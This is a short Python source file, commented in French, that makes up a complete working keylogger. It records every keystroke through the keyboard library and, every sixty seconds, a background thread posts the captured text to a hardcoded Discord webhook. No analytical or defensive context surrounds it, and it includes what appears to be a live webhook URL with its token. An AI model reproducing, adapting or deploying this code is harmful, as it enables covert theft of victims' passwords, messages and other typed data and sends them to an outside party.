import keyboard
import requests
import time

# Remplace par ton webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1353353580467458138/fvEgoFmiNhnQh1WCcJU-bDVwxXoFy5KOH4zapOXQuuMA8BrPOE4sUV3yyvplODME0jxn"

log_buffer = []  # Stocke les frappes avant envoi
SEND_INTERVAL = 60  # Temps entre chaque envoi (en secondes)

def send_to_discord(message):
    """Envoie un message au webhook Discord"""
    data = {"content": f"```{message}```"}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Erreur d'envoi : {e}")

def on_key_press(event):
    """Capture les touches pressées et les stocke"""
    global log_buffer
    key = event.name

    if key == "space":
        key = " "  # Remplace "space" par un vrai espace
    elif key == "enter":
        key = "\n"  # Retour à la ligne
    elif len(key) > 1:
        key = f"[{key}]"  # Encapsule les touches spéciales

    log_buffer.append(key)

def send_logs_periodically():
    """Envoie les logs à Discord à intervalle régulier"""
    while True:
        if log_buffer:
            message = "".join(log_buffer)
            send_to_discord(message)
            log_buffer.clear()  # Vide le buffer après envoi
        time.sleep(SEND_INTERVAL)

keyboard.on_press(on_key_press)

# Lance l'envoi en arrière-plan
import threading
threading.Thread(target=send_logs_periodically, daemon=True).start()

print("Keylogger actif... (CTRL + C pour arrêter)")
keyboard.wait()  # Garde le programme actif
